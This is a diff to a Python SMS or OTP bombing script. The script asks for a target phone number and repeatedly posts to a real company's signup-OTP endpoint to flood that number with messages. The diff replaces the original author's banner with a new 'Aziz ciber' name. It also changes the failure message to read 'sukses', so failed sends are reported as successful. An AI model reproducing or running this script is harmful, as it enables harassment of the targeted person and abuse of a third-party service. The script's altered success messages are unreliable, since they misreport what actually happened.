@@ -6,11 +6,11 @@ import sys
 
 def main():
 	os.system('clear')
-	os.system('figlet papiking21')
+	os.system('figlet Azis ciber')
 	banner='''
 
-	[+]AUTHOR:Papi king21
-	[+]Youtube : Papi King21
+	[+]AUTHOR:Aziz ciber
+	[+]Youtube : Aziz hacker
 	'''
 	print(banner)
 	no = input(' target : ')
@@ -31,7 +31,7 @@ def main():
 	for x in range (int(jum)):
 		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
 		if 'eror' in leosureo:
-			print('gagal Mengirim ' + no)
+			print('sukses mengirim ' + no)
 
 		else:
 			print('succes mengirim ' + no)
